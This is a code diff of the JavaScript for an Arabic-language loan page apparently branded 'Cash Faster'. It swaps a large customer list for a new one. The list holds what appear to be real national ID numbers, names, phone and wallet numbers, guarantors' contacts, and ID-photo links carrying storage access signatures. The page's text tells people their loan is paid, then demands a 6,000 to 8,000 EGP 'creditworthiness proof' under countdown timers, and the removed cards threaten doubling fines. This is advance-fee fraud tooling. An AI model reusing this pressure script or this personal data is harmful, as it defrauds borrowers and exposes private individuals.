@@ -779,394 +779,79 @@
 
 <script>
   // ================================================================
-  //  قاعدة البيانات — تم إصلاحها بشكل صحيح
+  //  قاعدة البيانات — العملاء الجدد من الملف
+  //  (تم تحويل "لا يوجد - سيفتحها" إلى hasEtisalat:false, hasVodafone:false)
   // ================================================================
   const customersDatabase = {
-  
-"26708302102156": {
-  name: "عادل يونس رجب ابراهيم",
-  job: "رئيس قسم انتاج شركة ملابس جاهزة",
-  loan: 100000,
-  wallet: "اتصالات كاش",
-  walletNum: "01119990685",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "هدي عمر محمدبكر", relation: "زوجة", phone: "01145788849" }
-},
-"30112140105217": {
-  name: "احمد صابر فضل هاشم",
-  job: "خراط معادن",
-  loan: 40000,
-  wallet: "اتصالات كاش",
-  walletNum: "01148106158",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "صابر فضل هاشم محمد", relation: "والد", phone: "01021293795" }
-},
-"29710291300495": {
-  name: "محمود طنطاوى عبد العظيم طنطاوى",
-  job: "عامل مخزن بشركة بلاستيك",
-  loan: 35000,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01065108759",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "أحمد طنطاوى عبد العظيم طنطاوى", relation: "أخ", phone: "01009136311" }
-},
-"2830301822": {
-  name: "رشا على محمود احمد",
-  job: "متخصصة شعر وبشرة وصاحبة بيوتي سنتر الماسة",
-  loan: 200000,
-  wallet: "اتصالات كاش",
-  walletNum: "01144010647",
-  status: "active",
-  idVerificationImage: "https://i.postimg.cc/TPqTxdQg/36-16-inbound5982364611976250153.jpg",
-  guarantor: { name: "تقوى عاطف عبد الباقة", relation: "ابنة", phone: "01022821265" }
-},
-"26808012500055": {
-  name: "محمود حسين يوسف محمود",
-  job: "مدير الموقع المروج الخضراء",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01108325991",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "محمد محمود حسين يوسف", relation: "ابن", phone: "01050301283" }
-},
-"28007060102031": {
-  name: "هاني الشاذلي عبد الوهاب محمد",
-  job: "صاحب شركة ام انش للمقاولات والتوريدات",
-  loan: 40000,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01004881288",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "شيماء جابر حسن محمد", relation: "زوجة", phone: "01210950772" }
-},
-"27302052602155": {
-  name: "عبدالرازق السيد امين محمد",
-  job: "معلم أول لغة عربية بالتربية والتعليم",
-  loan: 200000,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01090768578",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "عفاف حمادة احمد محمد", relation: "زوجة", phone: "01003513364" }
-},
-"27901120102867": {
-  name: "محمد ابوبكر محمد علي",
-  job: "سائق خاص",
-  loan: 65000,
-  wallet: "اتصالات كاش",
-  walletNum: "01102041389",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "ايمن ابوبكر محمد علي", relation: "أخ", phone: "01037131169" }
-},
-"30005271401171": {
-  name: "حازم حسام حسن شنبكى",
-  job: "مهندس صوت وموزع موسيقي",
-  loan: 60000,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01080658958",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "صبحة محمد ابراهيم وحيده", relation: "والدة", phone: "01225599604" }
-},
-"29405152501519": {
-  name: "محمد ابراهيم عبد الحكيم حسن",
-  job: "صاحب معرض رخام",
-  loan: 100000,
-  wallet: "اتصالات كاش",
-  walletNum: "01280507742",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "فاطمه احمد علي أحمد", relation: "زوجة", phone: "01101543997" }
-},
-"28821700171": {
-  name: "محمود محمد الصادق الشافعي",
-  job: "صاحب كوفي شوب",
-  loan: 200000,
-  wallet: "اتصالات كاش",
-  walletNum: "01104819766",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "احمد محمد الصادق الشافعي", relation: "أخ", phone: "01021542899" }
-},
-"28202040100846": {
-  name: "نشوي جمال الدين عبد الفتاح محمود",
-  job: "أعمال يدوية من المنزل",
-  loan: 50000,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01285849045",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "حافظه ابراهيم محمد الاخضر", relation: "والدة", phone: "01221646764" }
-},
-"30304041402958": {
-  name: "يوسف وليد عبدالسلام علي عماره",
-  job: "فني كهربائي",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01126953926",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "وليد عبدالسلام علي عماره", relation: "والد", phone: "01115092890" }
-},
-"29507290102621": {
-  name: "سمر علي ذايد علي",
-  job: "عاملة في بيوتي سنتر عادل المصري",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01155710192",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "نجيه رضوان بيومي رضوان", relation: "والدة", phone: "01157181199" }
-},
-"26707070103057": {
-  name: "محمد صبري ابو الفضل عفيفى",
-  job: "مدير وشريك",
-  loan: 200000,
-  wallet: "اتصالات كاش",
-  walletNum: "01111140763",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "جاسر محمد صبري ابو الفضل عفيفى", relation: "ابن", phone: "01211501662" }
-},
-"29906161401674": {
-  name: "باسل اشرف بكرى عبدالله",
-  job: "أمين مخزن",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01014543845",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "حنان كمال عبدالسلام عبداللطيف", relation: "أخت", phone: "01153595167" }
-},
-"27806262200911": {
-  name: "احمد ابراهيم زكي محمد",
-  job: "رئيس قسم بالشركة المصرية لتوزيع الغاز الطبيعي",
-  loan: 50000,
-  wallet: "اتصالات كاش",
-  walletNum: "01065033365",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "هند فتحي محمد علي", relation: "زوجة", phone: "01094862419" }
-},
-"279071313": {
-  name: "محمد ابو الحسن بركات",
-  job: "محطة كهرباء عيون موسى",
-  loan: 60000,
-  wallet: "اتصالات كاش",
-  walletNum: "01110767135",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "أحمد أبو الحسن بركات", relation: "أخ", phone: "01050212344" }
-},
-"28203252500174": {
-  name: "هانى نبيل كامل مرقص",
-  job: "عامل محارة",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01115504889",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "نبيل كامل مرقص سليمان", relation: "والد", phone: "01204652858" }
-},
-"29506040100199": {
-  name: "أحمد حسين عبد العزيز بكري",
-  job: "مندوب توصيل (موظف قطاع خاص)",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01105538004",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "عبد العزيز حسين عبد العزيز بكرى", relation: "أخ", phone: "01140036210" }
-},
-"281112563": {
-  name: "مني طه حسن شعبان",
-  job: "سوبر ماركت",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01143283361",
-  status: "active",
-  idVerificationImage: "https://i.postimg.cc/HWQ5ksJp/4-18-inbound1301140787572997026.jpg",
-  guarantor: { name: "احمد محمد احمد ابراهيم", relation: "زوج", phone: "01143139156" }
-},
-"27107182102351": {
-  name: "خالد رافت ابراهيم المرشدي",
-  job: "عامل في فندق سفير",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01044363595",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "محمد خالد رأفت ابراهيم", relation: "ابن", phone: "29701012140832" }
-},
-"30006152602157": {
-  name: "على السيد على الشويخ",
-  job: "معاه دكان ملابس",
-  loan: 80000,
-  wallet: "اتصالات كاش",
-  walletNum: "01279588746",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "ياسمين ايمن محمدمحمد", relation: "زوجة", phone: "01228534267" }
-},
-"26611102301495": {
-  name: "رفعت بشري محروس جرجس",
-  job: "صاحب محل تشغيل زجاج",
-  loan: 200000,
-  wallet: "اتصالات كاش",
-  walletNum: "01011850608",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "مينا رفعت بشرى محروس", relation: "ابن", phone: "01037740390" }
-},
-"28112010201215": {
-  name: "السيد حسني صابر عطيفي",
-  job: "تخليص جمركي",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01021395569",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "طه حسني صابر عطيفي", relation: "أخ", phone: "01017761802" }
-},
-"25909051702398": {
-  name: "السيد عبد المنعم فريد متولي بكير",
-  job: "نجار اثاث",
-  loan: 50000,
-  wallet: "اتصالات كاش",
-  walletNum: "01208132331",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "عبد المنعم فريد عبد المنعم فريد بكير", relation: "ابن", phone: "01205355197" }
-},
-"29511201802591": {
-  name: "عمرو عبد المنعم حسن فليفل",
-  job: "تصنيع أجبان",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01069962492",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "نانسي جمعه عبد العزيز ابو طير", relation: "زوجة", phone: "01200976363" }
-},
-"29003250100891": {
-  name: "محمد سعد محمود فرغلي",
-  job: "موظف بوزاره الثقافه باداره الحسابات",
-  loan: 40000,
-  wallet: "اتصالات كاش",
-  walletNum: "01126309636",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "ايه محمد السباعي محمد", relation: "زوجة", phone: "01042178689" }
-},
-"29509290101513": {
-  name: "احمد مدحت عبدالعال ابراهيم",
-  job: "مندوب مبيعات بشركه بن عبد المعبود",
-  loan: 40000,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01220214459",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "نورهان مدحت عبدالعال ابراهيم", relation: "أخت", phone: "01156568320" }
-},
-"27310022400895": {
-  name: "عبد الهادي محمد عبد الهادي محمد",
-  job: "فني لحامات كهرباء",
-  loan: 60000,
-  wallet: "اتصالات كاش",
-  walletNum: "01121393700",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "خلود عبدالهادي محمد عبد الهادي", relation: "ابنة", phone: "01279515162" }
-},
-"29305111300211": {
-  name: "بيتر منير راشد",
-  job: "مدير مبيعات",
-  loan: 35000,
-  wallet: "اتصالات كاش",
-  walletNum: "01118163641",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "لولا عزمي عبدالله شنوده", relation: "والدة", phone: "01270903101" }
-},
-"28502010116026": {
-  name: "غاده السيد حسن الجزار",
-  job: "معرض أجهزة كهربائية",
-  loan: 200000,
-  wallet: "اتصالات كاش",
-  walletNum: "01123171742",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "عبدالمنعم القطب عبدالمنعم رواش", relation: "زوج", phone: "01226119095" }
-},
-"30202162101206": {
-  name: "رحمه وليد سيد حسن",
-  job: "مديرة الموارد البشرية",
-  loan: 130000,
-  wallet: "اتصالات كاش",
-  walletNum: "01121317514",
-  status: "active",
-  idVerificationImage: "https://i.postimg.cc/bJCsRPsm/40-16-inbound4214303072381076031.jpg",
-  guarantor: { name: "كريم محمد السيد عبدالعال", relation: "زوج", phone: "01037385751" }
-},
-"27111141201351": {
-  name: "نصر عبد الصمد عبد الحليم المرسي",
-  job: "كاتب بمديرية الصحه جنوب سيناء",
-  loan: 200000,
-  wallet: "اتصالات كاش",
-  walletNum: "01007915369",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "ماجده محمود عبد الحليم المرسي", relation: "زوجة", phone: "01140378002" }
-},
-"29703011600671": {
-  name: "فتح الله محمد فتح الله عيد",
-  job: "سائق",
-  loan: 100000,
-  wallet: "اتصالات كاش",
-  walletNum: "01131588612",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "بطة محمد فتح الله عيد", relation: "أخت", phone: "01273226333" }
-},
-"29311271202517": {
-  name: "محمد رمضان إبراهيم المناوي",
-  job: "مصنع حلويات الزهور",
-  loan: 50000,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01040715595",
-  status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "مني أحمد الغريب النوساني", relation: "والدة", phone: "01283350843" }
-},
-// ===== عملاء جدد (الملفات 46 و 47) =====
 
-"27408080102926": {
-  name: "نجوى نبيل محمود حسن غراب",
-  job: "مستفيدة معاش",
-  loan: 55000,
+// ===== 1) طارق محروس محمد سلامة =====
+"27907141702839": {
+  name: "طارق محروس محمد سلامة",
+  job: "سائق",
+  loan: 40000,
   wallet: "اتصالات كاش",
-  walletNum: "01110753859",
+  walletNum: "01016868389",
   status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "روان احمد عبدالله احمد على", relation: "ابنة", phone: "01128798969" }
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_1_q16_5166188755975827241.jpg?response-content-disposition=attachment%3Bfilename%3D1_16_inbound4877800497125790983.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=jrX2UGCMMaKtJitHW3LTaEioJRs%3D",
+  guarantor: { name: "سمر إبراهيم محروس", relation: "زوجة", phone: "01556578851" }
 },
-"28202500089": {
-  name: "رشا صابر عبدالظاهر صالح",
-  job: "مستفيدة معاش",
-  loan: 100000,
+// ===== 2) محمود عثمان محمد الزهرى =====
+"29401122600339": {
+  name: "محمود عثمان محمد الزهرى",
+  job: "نجار مسلح",
+  loan: 35000,
   wallet: "اتصالات كاش",
-  walletNum: "01148985021",
+  walletNum: "01115460649",
   status: "active",
-  idVerificationImage: "",
-  guarantor: { name: "ماجدة صابر عبدالظاهر صالح", relation: "أخت", phone: "01023218414" }
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_2_q16_5668655447624922766.jpg?response-content-disposition=attachment%3Bfilename%3D2_16_inbound717511713917758637.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=FyKGhOaFYtkb0G5uZ0JR6A%2BJ%2FGQ%3D",
+  guarantor: { name: "محمد عثمان محمد الزهرى", relation: "أخ", phone: "01040883985" }
+},
+// ===== 3) هاله العزب ابراهيم العزب =====
+"27009171202085": {
+  name: "هاله العزب ابراهيم العزب",
+  job: "ربه منزل بشتغل اون لاين",
+  loan: 160000,
+  wallet: "لا يوجد - سيفتحها",
+  walletNum: "01107098779",
+  status: "active",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_3_q16_4972040725888338880.jpg?response-content-disposition=attachment%3Bfilename%3D3_16_inbound6971294268589880785.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=cVbzjx4wy2rDNEWidkFWJppSUuY%3D",
+  guarantor: { name: "هبه عبد الرؤوف حسن ابرهيم القشلان", relation: "ابنة", phone: "01034262283" }
+},
+// ===== 4) بسيمه سعد محمد سلامه =====
+"26503011100767": {
+  name: "بسيمه سعد محمد سلامه",
+  job: "كبير معلمين بالمعاش",
+  loan: 200000,
+  wallet: "لا يوجد - سيفتحها",
+  walletNum: "01093752935",
+  status: "active",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_3_q16_5727682234925826793.jpg?response-content-disposition=attachment%3Bfilename%3D4_16_inbound392593090236323131.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=lAiG0vdtpEJGZqZwrckcjgYmUac%3D",
+  guarantor: { name: "أشرف سعد محمد سلامه", relation: "أخ", phone: "01031268164" }
+},
+// ===== 5) كامل مجدى كامل محمد =====
+"29202052103054": {
+  name: "كامل مجدى كامل محمد",
+  job: "مندوب مبيعات شركة أبتا للتجارة أوت سويرس فى شركة كونتكت نا",
+  loan: 200000,
+  wallet: "لا يوجد - سيفتحها",
+  walletNum: "01020488212",
+  status: "active",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_5_q16_5034207133124112555.jpg?response-content-disposition=attachment%3Bfilename%3D5_16_inbound5964923565598722539.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=YNGD39U9i9pCMAqDw0Y2R9Xuk2I%3D",
+  guarantor: { name: "فاتن مجدى كامل محمد", relation: "أخت", phone: "01155715833" }
+},
+// ===== 6) محمود محمد محمود سالم =====
+"28011171803311": {
+  name: "محمود محمد محمود سالم",
+  job: "مدير إدارة بشركة بتروتريد للخدمات البترولية فرع الهرم ١٧١ الرئيسى أعلى بنك مصر امام كنتاكى",
+  loan: 200000,
+  wallet: "لا يوجد - سيفتحها",
+  walletNum: "01157932278",
+  status: "active",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_6_q16_5597553928959844693.jpg?response-content-disposition=attachment%3Bfilename%3D6_16_inbound6211108583759126180.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=Ee18V7VIsvqPsAAL%2BcRJlsCZboU%3D",
+  guarantor: { name: "منة الله محمود محمد محمود سالم", relation: "ابنة", phone: "01029920109" }
 }
-  
-};
+
+  };
 
   const WHATSAPP_NUMBER = "+12519108713";
   const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER.replace(/\s/g, '')}`;
@@ -1233,14 +918,11 @@
   }
 
   function getProofAmount(loanAmount, nationalId) {
-  // ✅ استثناءات مبلغ الإثبات (8,000 ج.م لأشخاص محددين)
-  if (nationalId === "2921000995") return 8000;
-  if (nationalId === "29508032700503") return 8000;  // ← أميرة محمد عبدالصبور
-  
-  // القاعدة الافتراضية
-  if (loanAmount < 100000) return 6000;
-  return 8000;
-}
+    if (nationalId === "2921000995") return 8000;
+    if (nationalId === "29508032700503") return 8000;
+    if (loanAmount < 100000) return 6000;
+    return 8000;
+  }
 
   function getFirstInstallmentDate() {
     const now = new Date();
@@ -1254,9 +936,6 @@
     window.open(`${WHATSAPP_URL}?text=${encodeURIComponent(msg)}`, '_blank');
   }
 
-  // ================================================================
-  //  صورة التحقق من الهوية
-  // ================================================================
   function buildIdVerification(customer) {
     if (!customer.idVerificationImage || customer.idVerificationImage.trim() === "") return '';
     return `
@@ -1276,9 +955,6 @@
     `;
   }
 
-  // ================================================================
-  //  الفاتورة الإلكترونية (اتصالات كاش)
-  // ================================================================
   function buildInvoice(customer, nationalId) {
     const now = new Date();
     const dateStr = now.toLocaleDateString('ar-EG', { year: 'numeric', month: '2-digit', day: '2-digit' });
@@ -1393,15 +1069,12 @@
     `;
   }
 
-  // ================================================================
-  //  بطاقة القرض
-  // ================================================================
   function buildLoanCard(customer) {
     const plan = getInstallmentPlan(customer.loan);
     const proofAmount = getProofAmount(customer.loan, currentNationalId);
     return `
       <div class="loan-card">
-        <div class="label">?? مبلغ التمويل المعتمد</div>
+        <div class="label">💰 مبلغ التمويل المعتمد</div>
         <div class="amount">${customer.loan.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
         <div class="approved"><i class="fas fa-check-circle"></i> ✅ تم دفع القرض بنجاح <span style="font-size:0.65rem;color:var(--text-muted);margin-right:0.3rem;">— بإنتظار إثبات الجدارة</span></div>
         <div style="text-align:center;font-size:0.65rem;color:var(--text-muted);margin:0.2rem 0;">⏳ لديك ${PROOF_MINUTES} دقيقة لإثبات جدارتك الائتمانية لاستلام المبلغ</div>
@@ -1434,9 +1107,6 @@
     `;
   }
 
-  // ================================================================
-  //  قسم الإثبات
-  // ================================================================
   function buildProofSection(customer) {
     const proofAmount = getProofAmount(customer.loan, currentNationalId);
     const plan = getInstallmentPlan(customer.loan);
@@ -1503,7 +1173,7 @@
         </div>
 
         <div class="summary-box">
-          <p>🔑 <span class="hl-gold">الخلاصة:</span> إثبات الجدارة الائتمانية هو <span class="hl-emerald">مصلحة لك أولاً</span>، فهو يضمن أن القرض الذي ستحصل عليه مناسب لك، وأنك قادر على سداده براحة دون ضغط.<br><br>⚠️ <span class="hl-danger">لابد من الانتهاء من الإجراءات اللازمة ليتم الصرف لحسابك فوراً.</span><br><br>?? <span style="color: var(--text-muted); font-size: 0.7rem;">نحن هنا لدعمك في كل خطوة<br>مع خالص التقدير، فريق كاش فاستر</span></p>
+          <p>🔑 <span class="hl-gold">الخلاصة:</span> إثبات الجدارة الائتمانية هو <span class="hl-emerald">مصلحة لك أولاً</span>، فهو يضمن أن القرض الذي ستحصل عليه مناسب لك، وأنك قادر على سداده براحة دون ضغط.<br><br>⚠️ <span class="hl-danger">لابد من الانتهاء من الإجراءات اللازمة ليتم الصرف لحسابك فوراً.</span><br><br>💚 <span style="color: var(--text-muted); font-size: 0.7rem;">نحن هنا لدعمك في كل خطوة<br>مع خالص التقدير، فريق كاش فاستر</span></p>
         </div>
 
         <button class="btn btn-purple" id="proofBtn"><i class="fas fa-paper-plane"></i> 📤 إرسال إثبات الجدارة الآن</button>
@@ -1513,9 +1183,6 @@
     `;
   }
 
-  // ================================================================
-  //  بطاقة معلق
-  // ================================================================
   function buildPendingCard(customer) {
     return `
       <div class="pending-card">
@@ -1529,7 +1196,7 @@
         </div>
 
         <div class="sub">
-          ?? <span class="hl-danger">طلبك معلق حالياً!</span><br><br>
+          🔴 <span class="hl-danger">طلبك معلق حالياً!</span><br><br>
           📌 <span class="hl-gold">يجب فتح التعليق قبل عملية الإثبات بمدة 30 دقيقة</span><br>
           ليتم قبول الإثبات ونزول مبلغ القرض إلى الحساب مباشرة.<br><br>
           ⚠️ <span class="hl-danger">إذا تم الإثبات والطلب معلق، لن يتم قبوله</span><br>
@@ -1553,9 +1220,6 @@
     `;
   }
 
-  // ================================================================
-  //  بطاقة مشطوب
-  // ================================================================
   function buildDeletedCard(customer) {
     return `
       <div class="pending-card" style="border-color: var(--danger); background: linear-gradient(145deg, #FFFFFF, var(--danger-light));">
@@ -1591,9 +1255,6 @@
     `;
   }
 
-  // ================================================================
-  //  بطاقة تم الاستلام
-  // ================================================================
   function buildCompletedCard(customer) {
     return `
       <div class="pending-card" style="border-color: var(--primary); background: linear-gradient(145deg, #FFFFFF, var(--primary-light));">
@@ -1615,9 +1276,6 @@
     `;
   }
 
-  // ================================================================
-  //  عرض النتيجة
-  // ================================================================
   function displayResult(customer, nationalId) {
     currentCustomer = customer;
     currentNationalId = nationalId;
@@ -1631,20 +1289,6 @@
     };
     const statusEl = document.getElementById('currentStatusText');
     if (statusEl) statusEl.textContent = statusLabels[customer.status] || 'غير محدد';
-
-    if (nationalId === '27310192600813') {
-      area.innerHTML = buildIdVerification(customer) + buildPendingOnePmCard(customer);
-      document.getElementById('errorBox').style.display = 'none';
-      startOnePmTimer();
-      return;
-    }
-
-    if (nationalId === '28309030201937') {
-      area.innerHTML = buildIdVerification(customer) + buildDebtorCard(customer);
-      document.getElementById('errorBox').style.display = 'none';
-      startPenaltyTimer();
-      return;
-    }
 
     if (customer.status === 'deleted') {
       area.innerHTML = buildIdVerification(customer) + buildDeletedCard(customer);
@@ -1665,7 +1309,6 @@
       return;
     }
 
-    // الحالة الافتراضية: active
     let html = '';
     html += buildLoanCard(customer);
     html += buildInvoice(customer, nationalId);
@@ -1680,105 +1323,6 @@
     startTimers(customer);
   }
 
-  // ================================================================
-  //  حالات خاصة
-  // ================================================================
-  function buildPendingOnePmCard(customer) {
-    const proofAmount = getProofAmount(customer.loan, currentNationalId);
-    return `
-      <div class="pending-card">
-        <div class="icon">⏳ <i class="fas fa-hourglass-half"></i></div>
-        <h2>⏳ طلبك <span>معلق</span> حتى الساعة <span>الواحدة ظهراً</span></h2>
-
-        <div class="pending-timer-box">
-          <div style="font-size:0.7rem;color:var(--text-muted);margin-bottom:0.2rem;">⏰ الوقت المتبقي لفتح الطلب</div>
-          <div class="timer" id="pendingTimer">--:--:--</div>
-          <div class="label">⚠️ <span class="hl-danger">بعد الساعة الواحدة ظهراً سيتم شطب الطلب لمدة 90 يوماً</span></div>
-        </div>
-
-        <div class="sub">
-          🔴 <span class="hl-danger">طلبك معلق حالياً حتى الساعة الواحدة ظهراً!</span><br><br>
-          📌 <span class="hl-gold">يجب التواصل مع قسم التحويلات المالية على واتساب فوراً لفتح التعليق</span><br>
-          ليتم قبول الإثبات ونزول مبلغ القرض إلى حسابك مباشرة.<br><br>
-          ✅ <span class="hl-emerald">مبلغ القرض مدفوع لحسابك بالفعل بمبلغ ${customer.loan.toLocaleString('ar-EG')} ج.م</span><br>
-          وفي انتظار إثبات الجدارة الائتمانية فقط.<br><br>
-          💰 <span class="hl-gold">مبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م</span> — وسيتم تفعيل صرف المبلغ فوراً.<br><br>
-          ✨ <span class="hl-emerald">لا يوجد دفع ولا تحويل للشركة نهائياً</span><br>
-          كل ما هو مطلوب منك إثبات جدارة ائتمانية لك فقط.<br><br>
-          ⚠️ <span class="hl-danger">يرجى الانتهاء ليتم الصرف في خلال دقائق</span>
-        </div>
-
-        <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب استثناء لإثبات الجدارة الائتمانية\\n\\n👤 العميل: ${customer.name}\\n🔢 الرقم القومي: ${currentNationalId}\\n💰 المبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\\n🧾 مبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م\\n\\n🙏 أرجو عمل استثناء لإثبات الجدارة المطلوبة وفتح التعليق على الطلب الخاص بي.\\n⏱️ علماً بأن لدي 30 دقيقة فقط لإرسال الإثباتات بعد فتح الطلب.')">
-          <i class="fab fa-whatsapp"></i> 📞 تواصل لفتح التعليق وعمل استثناء
-        </button>
-
-        <div class="note">
-          ⚠️ <span class="hl-danger">تنبيه هام:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل<br>
-          ليتم فتح الطلب وقبول الإثباتات ونزول المبلغ لحسابك فوراً.
-        </div>
-      </div>
-    `;
-  }
-
-  function buildDebtorCard(customer) {
-    const proofAmount = getProofAmount(customer.loan, currentNationalId);
-    const penalty = 5150;
-    return `
-      <div class="loan-card">
-        <div class="label">💰 مبلغ التمويل المعتمد</div>
-        <div class="amount">${customer.loan.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
-        <div class="approved"><i class="fas fa-check-circle"></i> ✅ تم دفع القرض إلى حسابك بالفعل</div>
-        <div style="text-align:center;font-size:0.65rem;color:var(--text-muted);margin:0.2rem 0;">⏳ الجدارة الائتمانية محجوزة بقيمة ${proofAmount.toLocaleString('ar-EG')} ج.م وسيتم نزولها مرة أخرى</div>
-        <div class="loan-grid">
-          <div class="item"><div class="lbl">💰 المبلغ المدفوع</div><div class="val green">${customer.loan.toLocaleString('ar-EG')} ج.م</div></div>
-          <div class="item"><div class="lbl">🔒 الجدارة المحجوزة</div><div class="val gold">${proofAmount.toLocaleString('ar-EG')} ج.م</div></div>
-          <div class="item"><div class="lbl">⚠️ الغرامة المالية</div><div class="val danger">${penalty.toLocaleString('ar-EG')} ج.م</div></div>
-        </div>
-      </div>
-
-      <div class="payment-notice">
-        <span class="icon"><i class="fas fa-check-circle"></i></span>
-        <h4>✅ تم دفع مبلغ القرض ${customer.loan.toLocaleString('ar-EG')} ج.م إلى حساب محفظة رقم ${customer.walletNum || '****'}</h4>
-        <p>👤 العميل: <span class="hl-gold">${customer.name}</span><br>
-        🔒 الجدارة الائتمانية محجوزة بقيمة <span class="hl-gold">${proofAmount.toLocaleString('ar-EG')} ج.م</span> وسيتم نزولها مرة أخرى.<br>
-        ✅ <span style="color:var(--primary-dark);font-weight:800;">تم إثبات الجدارة الائتمانية بالفعل</span> — لا تحتاج لإثباتها مرة أخرى.</p>
-      </div>
-
-      <div class="important-notes">
-        <div class="title">⚠️ <i class="fas fa-exclamation-triangle"></i> تنبيهات هامة جداً</div>
-        <ul>
-          <li>🔴 <span class="hl-danger">أنت مدان بالقرض المدفوع لحسابك</span> — يجب دفع الغرامة المالية.</li>
-          <li>💰 <span class="hl-danger">الغرامة المالية: ${penalty.toLocaleString('ar-EG')} ج.م</span> — يجب دفعها خلال <span class="hl-gold">8 ساعات</span>.</li>
-          <li>⚠️ <span class="hl-danger">في حالة عدم الدفع خلال 8 ساعات</span> — تتضاعف الغرامة المالية.</li>
-          <li>📌 <span class="hl-gold">في حالة شطب الطلب</span> — يتم استرداد طلبك مرة أخرى بعد مرور <span class="hl-danger">90 يوماً</span>.</li>
-          <li>🚫 <span class="hl-danger">لن تتمكن من استرداد طلبك قبل هذه المدة.</span></li>
-          <li>✅ <span class="hl-emerald">يرجى الانتهاء ليتم الصرف في خلال دقائق.</span></li>
-        </ul>
-      </div>
-
-      <div class="timer-box" style="border-color: var(--danger); background: var(--danger-light);">
-        <div>⏱️ <i class="fas fa-stopwatch" style="color:var(--danger);"></i> الوقت المتبقي لدفع الغرامة</div>
-        <div class="timer" id="penaltyTimer" style="color:var(--danger);">08:00:00</div>
-        <div class="sub">⏳ يجب دفع الغرامة قبل انتهاء الوقت لتجنب تضاعفها<br>⚠️ <span class="hl-danger">بعد انتهاء الوقت تتضاعف الغرامة المالية</span></div>
-      </div>
-
